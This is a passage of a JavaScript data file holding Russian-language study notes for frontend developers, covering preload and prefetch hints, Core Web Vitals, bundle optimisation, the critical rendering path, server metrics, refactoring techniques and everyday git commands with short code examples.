<!-- preload — загрузить прямо сейчас, высокий приоритет -->
<link rel="preload" href="font.woff2"   as="font"   crossorigin>  <!-- шрифт (crossorigin обязателен) -->
<link rel="preload" href="hero.jpg"     as="image">               <!-- LCP-изображение -->
<link rel="preload" href="critical.js"  as="script">              <!-- скрипт нужный сразу -->
<link rel="preload" href="critical.css" as="style">               <!-- CSS нужный сразу -->

<!-- prefetch — загрузить в фоне, низкий приоритет (для будущей навигации) -->
<link rel="prefetch" href="next-page.js">   <!-- JS следующей страницы -->
<link rel="prefetch" href="next-page.css">  <!-- CSS следующей страницы -->

<!-- preconnect — только установить соединение заранее, без загрузки ресурса -->
<link rel="preconnect" href="https://api.com">
\`\`\`

**Атрибут \`as\` обязателен для \`preload\`** — без него браузер не знает тип ресурса и:
• не расставит правильный приоритет загрузки (шрифты и стили важнее картинок)
• загрузит ресурс дважды — один раз по preload-хинту без типа, второй раз когда встретит тег в HTML
• может проигнорировать preload совсем

Допустимые значения \`as\`: \`font\`, \`image\`, \`script\`, \`style\`, \`fetch\`, \`document\`, \`audio\`, \`video\`, \`worker\`.

**\`crossorigin\`** — атрибут который переводит запрос в CORS-режим: браузер добавляет заголовок \`Origin\` и ожидает \`Access-Control-Allow-Origin\` в ответе. Без него запрос идёт без учётных данных и без CORS-заголовков.

**Для шрифтов обязателен \`crossorigin\`** — даже если шрифт на том же домене. Спецификация требует загружать шрифты в CORS-режиме всегда. Если у preload-хинта нет \`crossorigin\`, а у реального запроса шрифта он есть — браузер считает их разными запросами и загружает дважды:
\`\`\`html
<!-- ✅ правильно: -->
<link rel="preload" href="/fonts/Inter.woff2" as="font" type="font/woff2" crossorigin>

<!-- ❌ будет двойная загрузка: -->
<link rel="preload" href="/fonts/Inter.woff2" as="font">
\`\`\`` },
      { name: 'Метрики клиентской производительности', level: '3', content: `**Core Web Vitals** — метрики которые Google использует для ранжирования:

**LCP (Largest Contentful Paint)** — время загрузки самого большого элемента (картинка, заголовок, видео).
Хорошо: < 2.5s · Нужно улучшить: 2.5–4s · Плохо: > 4s
Что влияет: медленный сервер, большие картинки, блокирующие скрипты.

**INP (Interaction to Next Paint)** — время от взаимодействия до следующей отрисовки. Заменил FID в 2024.
Хорошо: < 200ms · Нужно улучшить: 200–500ms · Плохо: > 500ms
Что влияет: Long Tasks блокирующие главный поток.

**CLS (Cumulative Layout Shift)** — визуальная стабильность, насколько элементы прыгают при загрузке.
Хорошо: < 0.1 · Нужно улучшить: 0.1–0.25 · Плохо: > 0.25
Что влияет: картинки без width/height, динамически вставляемые элементы, веб-шрифты.

**Другие метрики:**
• **FCP (First Contentful Paint)** — первый контент на экране. Хорошо: < 1.8s
• **TTFB (Time To First Byte)** — время до первого байта от сервера. Хорошо: < 800ms. Что влияет: сервер, CDN, БД.
• **TTI (Time To Interactive)** — когда JS загружен и страница полностью интерактивна. Хорошо: < 3.8s

**Как измерять:**
• **Lighthouse** — синтетические тесты (лабораторные условия)
• **DevTools Performance** — реальная запись сессии
• **PageSpeed Insights** — онлайн, показывает реальные данные пользователей (CrUX)
• **web-vitals** — реальные данные прямо из браузера пользователей:
\`\`\`js
import { getLCP, getINP, getCLS } from 'web-vitals';

getLCP(metric => sendToAnalytics(metric));
getINP(metric => sendToAnalytics(metric));
getCLS(metric => sendToAnalytics(metric));
\`\`\`` },
      { name: 'Механизмы уменьшения размера бандла, CDN', level: '3', content: `**Бандл** — итоговая сборка проекта: все JS/CSS собраны в один (или несколько) файлов для браузера.

**1. Tree Shaking** — удаляет неиспользуемый код при сборке. Работает только с ES modules:
\`\`\`js
import { debounce } from 'lodash-es'; // ✅ возьмёт только debounce
const _ = require('lodash');          // ❌ возьмёт всю lodash
\`\`\`
Webpack/Vite анализируют импорты статически → помечают dead code → минификатор удаляет.

**2. Code Splitting + Lazy Loading** — разбиваем бандл на чанки, грузим только нужное:
\`\`\`js
// Динамический импорт — создаёт отдельный чанк:
const module = await import('./heavyModule');

// React.lazy + Suspense:
const Dashboard = React.lazy(() => import('./Dashboard'));
<Suspense fallback={<Spinner />}><Dashboard /></Suspense>
\`\`\`
Результат: \`main.js\` (200kb) грузится сразу, \`dashboard.js\` (300kb) — только при переходе.

**3. Vendor/App разделение:**
\`\`\`
vendors.js — React, lodash, axios (меняется редко → кэшируется месяцами)
app.js     — твой код (меняется часто → обновляется при каждом деплое)
\`\`\`
Vite делает это автоматически. В Webpack — \`SplitChunksPlugin\`.

**4. Минификация (Terser)** — удаляет пробелы, комментарии, переименовывает переменные:
\`\`\`js
// До:
function calculateUserAge(birthDate) {
  const today = new Date();
  return today.getFullYear() - birthDate.getFullYear();
}
// После:
function a(b){const c=new Date();return c.getFullYear()-b.getFullYear()}
\`\`\`

**5. Compression (Gzip / Brotli)** — сжатие на сервере/CDN, браузер распаковывает автоматически:
\`\`\`
app.js     500kb
app.js.gz  150kb  (gzip)
app.js.br  120kb  (brotli — лучше gzip)
\`\`\`

**6. Замена тяжёлых библиотек:**
\`\`\`
moment.js → date-fns   (67kb → 13kb)
lodash    → lodash-es  (tree shaking работает)
axios     → fetch      (нативный, 0kb)
\`\`\`

**7. Анализ бандла** — визуальная карта что занимает место:
\`\`\`bash
npx webpack-bundle-analyzer  # для webpack
npx vite-bundle-visualizer   # для vite
\`\`\`

**CDN (Content Delivery Network)** — сеть серверов по всему миру хранящих копии файлов:
\`\`\`
Без CDN: пользователь в Японии → сервер в Москве → ~200ms
С CDN:   пользователь в Японии → CDN в Токио    → ~10ms
\`\`\`
Что хранят: картинки, видео, JS/CSS бандлы, шрифты, статику.
Дополнительно: кэширование (разгружает сервер), DDoS-защита, автосжатие, HTTP/2.
Популярные: **Cloudflare**, **AWS CloudFront**, **Cloudinary** (для изображений), **Vercel Edge Network**.

**Оптимизация изображений (критично для LCP):**
• Использовать **WebP/AVIF** вместо JPEG/PNG (–25-50% размера)
• **srcset + sizes** — браузер сам выбирает нужный размер, не грузит лишнего
• **loading="lazy"** — браузер откладывает загрузку картинки пока она не приблизится к viewport (below the fold = ниже видимой части экрана). Нативный атрибут, без JS. Не использовать для LCP-изображения — оно должно грузиться сразу.
• **decoding="async"** — декодирование (превращение сжатых байт в пиксели) выполняется вне main thread. Без него браузер блокирует поток на время декодирования → задержка рендеринга соседних элементов. С async — main thread свободен, декодирование идёт параллельно.
• CDN с auto-format (Cloudinary, imgix — автоматически конвертируют в WebP/AVIF)
\`\`\`html
<picture>
  <source srcset="hero.avif" type="image/avif">
  <source srcset="hero.webp" type="image/webp">
  <img
    src="hero.jpg"
    srcset="hero-400.jpg 400w, hero-800.jpg 800w"
    sizes="(max-width: 600px) 100vw, 800px"
    loading="eager"
    fetchpriority="high"
    alt="..."
  />
</picture>
\`\`\`
**fetchpriority="high"** — для LCP-изображения (выше preload в очереди загрузки).` },
      { name: 'Lazy-loading, оптимизация критичного пути', level: '4', content: `**Critical Rendering Path** — последовательность шагов браузера от HTML до пикселей на экране:
\`\`\`
1. HTML → парсинг → DOM
2. CSS  → парсинг → CSSOM
3. DOM + CSSOM → Render Tree → только то, что реально рисовать
4. Layout (Reflow) — вычисление размеров и позиций
5. Paint — отрисовка пикселей
6. Composite — слои объединяются
\`\`\`
**Render Tree** — то, что реально рисовать на экране. DOM знает структуру, CSSOM знает стили — Render Tree объединяет их и отбрасывает невидимое: \`display: none\` выбрасывает узел целиком (и всех потомков), \`<head>\`, \`<script>\`, \`<meta>\` не попадают в дерево. \`visibility: hidden\` — наоборот: узел остаётся в Render Tree, место занимает, просто не рисуется.

**CSS — render blocking ресурс.** Без CSSOM браузер не рендерит страницу. Поэтому CSS подключают в head — чтобы CSSOM построился как можно раньше.

**Layout / Paint / Composite — стоимость изменений:**
\`\`\`
width, height, margin, padding  → Layout + Paint + Composite  (дорого)
color, background, border-radius → Paint + Composite           (средне)
transform, opacity               → только Composite            (дёшево!)
\`\`\`
\`\`\`css
/* ❌ вызывает Layout: */
@keyframes move { from { left: 0; } to { left: 100px; } }

/* ✅ только Composite: */
@keyframes move { from { transform: translateX(0); } to { transform: translateX(100px); } }
\`\`\`

**GPU-слои и will-change:**
По умолчанию всё на одном слое — анимация перерисовывает весь экран через CPU. Браузер может вынести элемент на отдельный GPU-слой: тогда GPU двигает только его, не трогая остальное — быстро.

\`will-change\` — подсказка браузеру создать GPU-слой заранее (без него слой создаётся в момент анимации → рывок в начале):
\`\`\`css
.modal { will-change: transform; }
\`\`\`
Что автоматически создаёт GPU-слой: \`will-change: transform\`, \`opacity < 1\`, \`position: fixed\`.
Старые хаки (то же самое, хуже): \`transform: translateZ(0)\`, \`transform: translate3d(0,0,0)\`.

Не злоупотреблять — каждый слой занимает память GPU:
\`\`\`css
.card { will-change: transform; } /* ❌ 1000 карточек = 1000 слоёв */
.card:hover { will-change: transform; } /* ✅ только когда нужно */
\`\`\`
Или через JS — добавлять и убирать по необходимости:
\`\`\`js
el.addEventListener('mouseenter', () => el.style.willChange = 'transform');
el.addEventListener('mouseleave', () => el.style.willChange = 'auto');
\`\`\`

**Что блокирует рендеринг и как исправить:**
\`\`\`html
<!-- ✅ Critical CSS — инлайн в head (только above-the-fold стили): -->
<style>body { margin: 0; } .hero { ... }</style>

<!-- ✅ Остальной CSS — асинхронно: -->
<link rel="preload" href="styles.css" as="style" onload="this.rel='stylesheet'">

<!-- ✅ JS не блокирует парсинг: -->
<script src="app.js" defer></script>
\`\`\`

**Forced Reflow (Layout Thrashing)** — самая частая проблема: чтение и запись DOM в цикле:
\`\`\`js
// ❌ Layout Thrashing — каждая итерация вызывает Layout:
elements.forEach(el => {
  const height = el.offsetHeight;       // читаем → браузер делает Layout
  el.style.height = height * 2 + 'px'; // пишем → инвалидируем Layout
});

// ✅ Сначала все чтения, потом все записи:
const heights = elements.map(el => el.offsetHeight);    // все чтения
elements.forEach((el, i) => {
  el.style.height = heights[i] * 2 + 'px';              // все записи
});
\`\`\`
Свойства которые вызывают принудительный Layout при чтении: \`offsetHeight\`, \`offsetWidth\`, \`getBoundingClientRect()\`, \`scrollTop\`.

**Техники Lazy Loading:**

**1. Dynamic import + React.lazy + Suspense** — разбивает JS на чанки, загружает по требованию:
\`\`\`jsx
const HeavyComponent = React.lazy(() => import('./HeavyComponent'));

<Suspense fallback={<Spinner />}>
  <HeavyComponent />
</Suspense>
\`\`\`

**2. Route-based code splitting** — самый распространённый паттерн. Каждая страница грузится только когда пользователь на неё переходит:
\`\`\`jsx
const Dashboard = React.lazy(() => import('./pages/Dashboard'));
const Profile   = React.lazy(() => import('./pages/Profile'));
\`\`\`
Vite и CRA делают это из коробки при правильной настройке роутера.

**3. loading="lazy" на изображениях** — нативный браузерный lazy loading. Изображение не загружается, пока не попадает во viewport:
\`\`\`html
<img src="photo.jpg" loading="lazy" alt="...">
\`\`\`
Поддержка ~95% браузеров. Для LCP-изображения (первый экран) — не использовать, там нужен \`fetchpriority="high"\`.

**4. Intersection Observer** — гибкий способ lazy loading для любого контента:
\`\`\`js
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      loadComponent();
      observer.unobserve(entry.target);
    }
  });
});
observer.observe(element);
\`\`\`
Основа для бесконечного скролла, lazy-loaded секций, виртуализации списков.

**5. Виртуализация списков** — 10 000 элементов в DOM не рендерить все сразу, только видимые + буфер:
Библиотеки: \`react-window\`, \`react-virtual\`, \`@tanstack/virtual\`.

**6. Prefetch / Preload** — дополняет lazy loading:
\`\`\`html
<!-- prefetch — низкий приоритет, браузер грузит в фоне когда свободен -->
<link rel="prefetch" href="/dashboard.js">          <!-- следующая страница -->
<link rel="prefetch" href="/dashboard.css">         <!-- её стили -->

<!-- preload — высокий приоритет, скачать прямо сейчас -->
<!-- as= обязателен: говорит браузеру тип ресурса и приоритет -->
<link rel="preload" href="/font.woff2"  as="font"   crossorigin>  <!-- шрифт -->
<link rel="preload" href="/hero.jpg"    as="image">               <!-- LCP-изображение -->
<link rel="preload" href="/critical.js" as="script">              <!-- скрипт -->
<link rel="preload" href="/above.css"   as="style">               <!-- критический CSS -->
\`\`\`
\`crossorigin\` обязателен для шрифтов — даже если они с того же домена, браузер грузит их в CORS-режиме.` },
      { name: 'Метрики серверной производительности', level: '4', content: `**TTFB (Time To First Byte)** — время от запроса до первого байта ответа. Хорошо: < 800ms.
Что влияет: обработка на сервере, запросы к БД, сетевая задержка, CDN.

**RPS (Requests Per Second)** — сколько запросов сервер обрабатывает в секунду.
100 RPS — небольшой сервис, 10 000 RPS — высоконагруженный.

**Latency** — время обработки одного запроса. Меряют перцентилями:
\`\`\`
p50 =  50ms  — медиана (половина запросов быстрее)
p95 = 200ms  — 95% запросов быстрее этого
p99 = 500ms  — 99% запросов быстрее этого
\`\`\`
p99 важнее среднего — показывает худший опыт пользователей.

**Error Rate** — процент 5xx ошибок. Хорошо: < 0.1%, плохо: > 1%.

**CPU / Memory utilization:** CPU < 70% (запас на пики), память должна быть стабильной (рост = утечка).

**Мониторинг:** Datadog, New Relic (APM), Prometheus + Grafana (open source), Sentry Performance.

**Оптимизация:**
\`\`\`js
// Redis — кэшируем тяжёлые запросы к БД:
const cached = await redis.get('users:list');
if (cached) return JSON.parse(cached);
const users = await db.query('SELECT * FROM users');
await redis.set('users:list', JSON.stringify(users), 'EX', 300); // TTL 5 мин
return users;
\`\`\`
\`\`\`sql
-- Индекс ускоряет поиск с O(n) до O(log n):
CREATE INDEX idx_users_email ON users(email);
\`\`\`
Горизонтальное масштабирование: 1 сервер → 1000 RPS, 3 сервера + load balancer → 3000 RPS.` },
    ],
  },
  {
    id: 'refactoring',
    title: 'РЕФАКТОРИНГ',
    icon: '🔧',
    color: '#8D6E63',
    topics: [
      { name: 'Правила работы с комментариями при рефакторинге', level: '2', content: `**Хорошие комментарии:**\n• Объясняют ПОЧЕМУ, а не ЧТО\n• TODO / FIXME / HACK с обоснованием\n• JSDoc для публичных API\n• Регулярные выражения и сложные алгоритмы\n\n**Плохие комментарии:**\n• Описывают очевидный код\n• Устаревшие (не обновлены при рефакторинге)\n• Закомментированный код (удаляй, git помнит)\n\n**Правило:** если код требует комментария — сначала попробуй сделать код понятнее (переименовать, выделить функцию).` },
      { name: 'Основные принципы рефакторинга', level: '3', content: `**Рефакторинг** — изменение внутренней структуры без изменения поведения.\n\n**Принципы:**\n• Маленькие шаги + тесты после каждого шага\n• Не менять поведение и рефакторить одновременно\n• Тесты — safety net (без тестов рефакторинг рискован)\n• Роль тестов при рефакторинге — они ДОЛЖНЫ проходить после каждого изменения\n\n**Цели рефакторинга:** улучшить читаемость, убрать дублирование, упростить поддержку, подготовить к новой фиче.` },
      { name: 'Признаки грязного кода', level: '3', content: `**Code Smells:**\n• **Длинные функции/методы** (> 20-30 строк)\n• **Дублирование кода**\n• **Магические числа** (42 вместо MAX_RETRIES)\n• **Глубокая вложенность** (if внутри if внутри if)\n• **Большие классы / God Object** (один класс делает всё)\n• **Feature Envy** — метод больше работает с чужими данными, чем со своими\n• **Длинные списки параметров** (> 3 — используй объект)\n• **Мёртвый код** — недостижимый или неиспользуемый\n• **Shotgun Surgery** — одно изменение требует правок в 10 местах` },
      { name: 'Применять различные методы рефакторинга', level: '3', content: `**Extract Method (Извлечение метода)** — длинный блок кода → отдельная функция с говорящим именем:
\`\`\`js
// До — всё в одной функции, непонятно что делает каждый блок:
function processOrder(order) {
  if (!order.items.length || !order.userId) throw new Error('Invalid');
  let total = 0;
  for (const item of order.items) total += item.price * item.qty;
  if (order.promoCode === 'SALE10') total *= 0.9;
  db.save({ ...order, total, createdAt: Date.now() });
  email.send(order.userId, \`Ваш заказ на \${total}₽ принят\`);
}

// После — каждый шаг именован, функция читается как список действий:
function processOrder(order) {
  validateOrder(order);
  const total = calculateTotal(order);
  saveOrder(order, total);
  notifyUser(order.userId, total);
}
\`\`\`

**Extract Variable (Извлечение переменной)** — сложное выражение → именованная переменная:
\`\`\`js
// До — непонятно что означает условие:
if (user.age >= 18 && user.country === 'RU' && !user.isBanned) { }

// После — название объясняет смысл:
const canAccess = user.age >= 18 && user.country === 'RU' && !user.isBanned;
if (canAccess) { }
\`\`\`

**Inline Method (Инлайн метода)** — обратное Extract Method. Если метод тривиален и используется один раз — убрать лишний уровень:
\`\`\`js
// До — отдельный метод ради одной строки не добавляет ясности:
function isAdult(user) { return user.age >= 18; }
function check(user) { if (isAdult(user)) { } }

// После — прямо на месте понятнее:
function check(user) { if (user.age >= 18) { } }
\`\`\`

**Decompose Conditional (Разбиение условного оператора)** — сложный if/else → функции:
\`\`\`js
// До:
if (date.before(SUMMER_START) || date.after(SUMMER_END)) {
  charge = qty * winterRate + winterServiceCharge;
} else {
  charge = qty * summerRate;
}

// После — условие и ветки получают имена:
if (isWinter(date)) {
  charge = winterCharge(qty);
} else {
  charge = summerCharge(qty);
}
\`\`\`

**Replace Magic Number with Constant (Замена магических чисел):**
\`\`\`js
// До — непонятно что значат числа:
if (status === 2) { }
setTimeout(fn, 86400000);

// После — названия дают контекст:
const STATUS_ACTIVE = 2;
const ONE_DAY_MS = 24 * 60 * 60 * 1000;
if (status === STATUS_ACTIVE) { }
setTimeout(fn, ONE_DAY_MS);
\`\`\`

**Encapsulate Field (Инкапсуляция поля)** — прямой доступ к полю → геттер/сеттер для контроля:
\`\`\`js
// До — любой может записать любое значение:
class User { name = ''; }
user.name = ''; // можно сохранить пустую строку

// После — логика валидации в одном месте:
class User {
  #name = '';
  get name() { return this.#name; }
  set name(v) {
    if (!v.trim()) throw new Error('Name required');
    this.#name = v.trim();
  }
}
\`\`\`

**Introduce Parameter Object (Объект вместо длинного списка параметров):**
\`\`\`js
// До — 5 параметров, легко перепутать порядок:
function createUser(firstName, lastName, email, age, country) { }

// После — объект с именованными полями:
function createUser({ firstName, lastName, email, age, country }) { }
createUser({ firstName: 'Ivan', email: 'i@mail.ru', age: 25, country: 'RU', lastName: 'Petrov' });
\`\`\`

**Move Function (Перемещение функции)** — функция переезжает туда где используется больше всего:
\`\`\`js
// До — метод в Account, но работает в основном с данными Customer:
class Account {
  overdraftCharge() { if (this.type.isPremium) { ... this.customer.age ... } }
}

// После — перенести туда где контекст естественнее:
class CustomerType {
  overdraftCharge(account) { if (this.isPremium) { ... } }
}
\`\`\`

**Replace Conditional with Polymorphism** — большой switch/if по типу → классы с переопределёнными методами (связь с Open/Closed):
\`\`\`js
// До — каждый новый тип ломает функцию:
function getSpeed(bird) {
  switch (bird.type) {
    case 'EUROPEAN': return baseSpeed;
    case 'AFRICAN': return baseSpeed - bird.numberOfCoconuts * 2;
    case 'PARROT': return bird.isNailed ? 0 : baseSpeed + bird.voltage;
  }
}

// После — каждый тип сам знает свою скорость:
class EuropeanBird { getSpeed() { return baseSpeed; } }
class AfricanBird { getSpeed() { return baseSpeed - this.numberOfCoconuts * 2; } }
class ParrotBird { getSpeed() { return this.isNailed ? 0 : baseSpeed + this.voltage; } }
\`\`\`` },
      { name: 'Понимает текущий бэклог технического развития проекта', level: '4', content: `**Технический долг (Tech Debt)** — осознанные или случайные компромиссы в коде.\n\n**Бэклог тех. развития:**\n• Обновление зависимостей\n• Миграция на новые версии фреймворков\n• Покрытие тестами критических путей\n• Оптимизация производительности\n• Улучшение CI/CD\n• Документация архитектурных решений (ADR)\n\n**Senior-ответственность:** видеть картину целиком, приоритизировать тех. долг, обосновывать бизнесу время на рефакторинг, планировать миграции.` },
    ],
  },
  {
    id: 'git',
    title: 'GIT',
    icon: '📦',
    color: '#F4511E',
    topics: [
      { name: 'Базовые команды: pull, push, commit, fetch, add, clone', level: '2', content: `**Три зоны:**\nРабочая директория → git add → Staging area → git commit → Repository\n\n\`\`\`bash\ngit status          # статус файлов\ngit add file.js     # добавить файл в staging\ngit add .           # добавить все\ngit commit -m "msg" # зафиксировать\ngit push            # отправить на remote\ngit pull            # fetch + merge\ngit fetch           # скачать без merge (безопасно)\ngit clone <url>     # клонировать репо\n\`\`\`\nfetch vs pull: fetch скачивает изменения, но не применяет. pull = fetch + merge.\n\n**init + config:**\n\`\`\`bash\ngit init                               # инициализировать репо\ngit config --global user.name "Alex"   # имя для коммитов\ngit config --global user.email "..."   # email\ngit config --global core.editor vim    # редактор\ngit config --list                      # все настройки\n\`\`\`` },
      { name: 'branch, merge, remote', level: '2', content: `**branch:**\n\`\`\`bash\ngit branch              # список веток\ngit branch -a           # все включая remote\ngit branch feature      # создать ветку\ngit branch -d feature   # удалить ветку\ngit branch -m old new   # переименовать\n\ngit switch feature      # переключиться (Git 2.23+)\ngit switch -c feature   # создать и переключиться\n\`\`\`\n\n**merge:**\n\`\`\`bash\ngit merge feature         # влить feature в текущую ветку\ngit merge --no-ff feature # всегда создавать merge коммит\ngit merge --abort         # отменить merge при конфликте\n\`\`\`\nFast-forward — когда main не уходил вперёд, Git просто двигает указатель, merge коммита нет.\n--no-ff — всегда создаёт merge коммит, видно что была ветка.\n\n**remote:**\n\`\`\`bash\ngit remote -v                      # список remote\ngit remote add origin https://...  # добавить\ngit remote remove origin           # удалить\ngit remote rename origin upstream  # переименовать\n\ngit fetch origin       # скачать без merge\ngit pull origin main   # fetch + merge\n\`\`\`` },
      { name: 'amend, fixup, revert, cherry-pick, stash, rebase, .gitignore', level: '3', content: `**amend:**\n\`\`\`bash\ngit commit --amend -m "новое сообщение"  # изменить последний коммит\ngit commit --amend --no-edit             # добавить файлы без смены сообщения\n\`\`\`\n⚠️ Переписывает SHA коммита. Если уже запушен — нужен git push --force-with-lease.\n\n**stash:**\n\`\`\`bash\ngit stash                  # сохранить изменения\ngit stash save "описание"  # с описанием\ngit stash list             # список всех stash\ngit stash pop              # применить последний и удалить\ngit stash apply stash@{2}  # применить конкретный\ngit stash drop             # удалить последний\ngit stash clear            # удалить все\n\`\`\`\n\n**revert vs reset:**\n\`\`\`bash\ngit revert abc123         # новый коммит отменяющий abc123 (безопасно для remote)\n\ngit reset --soft HEAD~1   # коммит удалён, изменения в staging\ngit reset --mixed HEAD~1  # коммит удалён, изменения в рабочей директории\ngit reset --hard HEAD~1   # коммит и изменения удалены полностью\n\`\`\`\nПравило: reset только для локальных коммитов. revert когда коммит уже в remote.\n\n**cherry-pick:**\n\`\`\`bash\ngit cherry-pick abc123          # перенести один коммит\ngit cherry-pick abc123..def456  # диапазон коммитов\n\`\`\`\nИспользуется для хотфиксов — перенести исправление бага с одной ветки на другую.\n\n**rebase:**\n\`\`\`bash\ngit rebase main          # перебазировать текущую ветку на main\ngit rebase -i HEAD~3     # интерактивный rebase последних 3 коммитов\ngit rebase --abort       # отменить rebase\ngit rebase --continue    # продолжить после разрешения конфликта\n\`\`\`\n⚠️ Переписывает историю. Нельзя делать на публичных ветках которые используют другие.\n\n**fixup:**\n\`\`\`bash\ngit commit --fixup abc123             # создать коммит-исправление\ngit rebase -i --autosquash HEAD~5     # автоматически склеить fixup коммиты\n\`\`\`\n\n**.gitignore** — файлы которые git игнорирует (node_modules, .env, dist).` },
      { name: 'log, diff, reflog, tag', level: '3', content: `**log:**\n\`\`\`bash\ngit log --oneline --graph   # самый частый вариант\ngit log -n 5                # последние 5 коммитов\ngit log --author="Alex"     # коммиты автора\ngit log --since="2 weeks"   # за период\ngit log file.js             # история файла\n\`\`\`\n\n**diff:**\n\`\`\`bash\ngit diff                   # изменения не в staging\ngit diff --staged          # изменения в staging\ngit diff main feature      # разница между ветками\ngit diff abc123 def456     # разница между коммитами\n\`\`\`\n\n**reflog:**\n\`\`\`bash\ngit reflog               # история всех перемещений HEAD\ngit reset --hard abc123  # восстановить потерянный коммит\n\`\`\`\nХранит историю ~90 дней. Страховка от reset --hard.\n\n**tag:**\n\`\`\`bash\ngit tag v1.0.0                   # lightweight тег\ngit tag -a v1.0.0 -m "Release"  # annotated тег (предпочтительно)\ngit push origin v1.0.0           # запушить тег\ngit push origin --tags           # запушить все теги\ngit tag -d v1.0.0                # удалить тег\n\`\`\`` },
      { name: 'hooks', level: '4', content: `**Git Hooks** — скрипты в .git/hooks/ выполняющиеся автоматически при git командах.\n\n**Основные хуки:**\n• **pre-commit** — перед коммитом (линтинг, форматирование)\n• **commit-msg** — проверка формата сообщения\n• **pre-push** — перед push (тесты)\n\n**Husky** — шарит хуки между разработчиками через package.json:\n\`\`\`json\n{\n  "husky": {\n    "hooks": {\n      "pre-commit": "lint-staged",\n      "pre-push": "npm test"\n    }\n  }\n}\n\`\`\`\n**lint-staged** — запускает линтер только на изменённых файлах.` },
      { name: 'switch, restore', level: '4', content: `Новые команды (Git 2.23+), заменяющие перегруженный checkout:\n\n\`\`\`bash\ngit switch feature         # переключить ветку\ngit switch -c feature      # создать и переключить\n\ngit restore file.js              # восстановить файл из последнего коммита\ngit restore --staged file.js     # убрать файл из staging\n\`\`\`\n\ncheckout делал слишком много (переключение веток + откат файлов). switch и restore — чёткое разделение обязанностей.` },
      { name: 'Способы оптимизации рабочего пространства Git, git-lfs, сабмодули', level: '4', content: `**git-lfs (Large File Storage):**\nДля больших бинарных файлов (видео, дизайн, скриншоты). В репозитории хранится указатель, файл — на LFS сервере.\n\`\`\`bash\ngit lfs install\ngit lfs track "*.png"\ngit lfs track "*.psd"\ngit add .gitattributes\n\`\`\`\n\n**Субмодули:**\nВложенный git-репозиторий внутри основного. Для переиспользования библиотек между проектами.\n\`\`\`bash\ngit submodule add https://github.com/org/lib  # добавить\ngit submodule init                             # инициализировать\ngit submodule update                           # обновить\ngit clone --recurse-submodules https://...    # клонировать с субмодулями\n\`\`\`\nМинус — сложность синхронизации в команде.\n\n**Shallow clone:**\n\`\`\`bash\ngit clone --depth 1 <url>  # только последний коммит (быстрее для CI)\n\`\`\`` },
      { name: 'worktree', level: '4', content: `**git worktree** — несколько рабочих директорий одного репо одновременно. Позволяет работать в нескольких ветках без stash и переключений.\n\n\`\`\`bash\ngit worktree add ../hotfix main  # создать папку с веткой main\ngit worktree list                # список worktree\ngit worktree remove ../hotfix    # удалить\n\`\`\`\n\nКейсы: срочный hotfix без прерывания текущей работы, сравнение двух веток бок о бок, запуск тестов на одной ветке пока работаешь на другой.` },
    ],
  },
];
